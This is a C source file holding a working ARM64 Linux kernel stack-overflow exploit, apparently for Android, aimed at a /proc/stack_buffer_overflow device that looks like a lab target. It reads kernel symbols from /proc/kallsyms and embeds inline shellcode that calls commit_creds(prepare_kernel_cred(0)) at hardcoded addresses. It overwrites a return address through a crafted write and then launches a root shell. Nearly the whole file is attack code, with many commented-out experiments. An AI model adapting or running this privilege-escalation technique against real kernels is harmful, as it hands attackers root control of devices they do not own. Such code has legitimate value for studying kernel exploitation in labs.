#include <stdio.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>

#include <sys/mman.h>

#define MAX             64

void *prepare_kernel_cred;
void *commit_creds;
void *proc_file_write;

unsigned long data_addr;

void *
get_ksymbol(char *name)
{
	FILE *f = fopen("/proc/kallsyms", "r");
	char c, sym[512];
	void *addr;
	int ret;

	while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
		if (!strcmp(sym, name))
			return addr;
	}

	return NULL;
}

int
open_file(void)
{
	int fd = open("/proc/stack_buffer_overflow", O_RDWR);
	if (fd == -1)
		err(1, "open");
	return fd;
}

void
payload(void)
{
	if (getuid() == 0) {
		printf("[+] enjoy the shell\n");
		execl("/system/bin/sh", "/system/bin/sh", "-c", "", NULL);
	} else {
		warnx("failed to get root. How did we even get here?");
	}

	_exit(0);
}

/*ffffff8008082de4 t ret_to_user*/
/*ffffff8008082d38 t ret_fast_syscall*/

extern uint32_t shellcode[];
asm
(
	"    .text\n"
	"    .align 4\n"
	/*"    .code 32\n"*/
	"    .globl shellcode\n\t"
	"shellcode:\n\t"


	/*print dead beaf for debug*/
	"ldr     x3, =0xffffff800825d734\n\t"
	"mov     x0, #0xdead\n\t"
	"blr     x3\n\t"
	"ldr     x3, =0xffffff800825d734\n\t"
	"mov     x0, #0xbeaf\n\t"
	"blr     x3\n\t"

	/*commit_creds(prepare_kernel_cred(0));*/
	/*-> get root*/
	"ldr     x3, =0xffffff80080dc6f0\n\t"
	"mov     x0, #0\n\t"
	"blr     x3\n\t"
	"ldr     x3, =0xffffff80080dc018\n\t"
	"blr     x3\n\t"


	/*fast syscall */
	/*"ldr     x3, =0xffffff8008082d38\n\t"*/
	/*"mov     x0, #0\n\t"*/
	/*"blr     x3\n\t"*/
	/*"ldp     x29, x30, [sp],#96\n\t"*/
	/*"ldr       x3, =0x40000000\n\t"*/
	/*"mrs       x3, spsr_el1\n\t"*/
	/*"ldr       x3, #data_addr\n\t"*/
	/*"blr       x3"*/
	/* go to bash */
	/*"ldp     x19, x20, [sp,#16]\n"*/
	"mov     x0, x20\n\t"
	"ldp     x19, x20, [sp,#16]\n\t"
	"ldp     x29, x30, [sp],#32\n\t"
	"ret\n\t"


	/*ffffff8008082d38 t ret_fast_syscall*/
	/*"ldr       x3, =0xffffff8008082d3c\n\t"*/
	/*"blr       x3\n\t"*/

	/*"eret\n\t"*/
	/*"ldr       x5, #data_addr\n\t"*/
	/*"blr       x5\n\t"*/

	/*"msr     elr_el1, x5\n\t"*/
	/*"mov x29, #0\n\t"*/
	/*"eret\n\t"*/


/*k/Fix the trashed stack by restoring r4/r5 from duped values on the stack*/
	/*"ldr x0, =0xc0104610\t\n"*/
	/*"ldr x4, [sp] \t\n"*/
	/*"ldr x5, [sp, #4]\t\n"*/
	/*"blr x0\t\n"*/

	/* test */
	/*"ldr       x3, #data_addr\n\t"*/
	/*"blr       x3"*/
);

void print_data()
{
	printf("hello world\n");
}

void
trigger_vuln(int fd, int canary)
{

	/*print_data();*/
#define MAX_PAYLOAD (64 + 4 * sizeof(int))

	char buf[MAX_PAYLOAD];

	memset(buf, 0xff, sizeof(buf) - 4 * sizeof(int));

	void *pc = buf + MAX + 2 * sizeof(int);

	*(void **)pc  = (void *)shellcode;

	/* Kaboom! */
	write(fd, buf, sizeof(buf));
}

/*int*/
/*gather_information(int fd)*/
/*{*/
	/*int canary, i;*/

	/*if (lseek(fd, 32, SEEK_SET) == -1)*/
		/*err(2, "lseek");*/
	/*read(fd, &canary, sizeof(canary));*/

	/*printf("[+] found canary: %08x\n", canary);*/

	/*return canary;*/
/*}*/

void
resolve_kernel_symbols(void)
{
	prepare_kernel_cred     = get_ksymbol("prepare_kernel_cred");
	commit_creds            = get_ksymbol("commit_creds");
	proc_file_write         = get_ksymbol("proc_file_write");

	if (!prepare_kernel_cred || !commit_creds)
		printf("couldn't map all kernel symbols");
}


void (*asm_run)(void);

int main(void)
{
	int fd, canary;

	/*resolve_kernel_symbols();*/

	printf("payload addr %lx\n", payload);
	data_addr = payload;
	asm_run = (void *)shellcode;
	/*asm_run();*/
	fd = open_file();
	/*canary = gather_information(fd);*/

	trigger_vuln(fd, canary);

	printf("payload addr %lx\n", payload);

	payload();
	/* If we're here, we've failed. */
	close(fd);

	printf("[-] exploit failed\n");
	return 0;
}
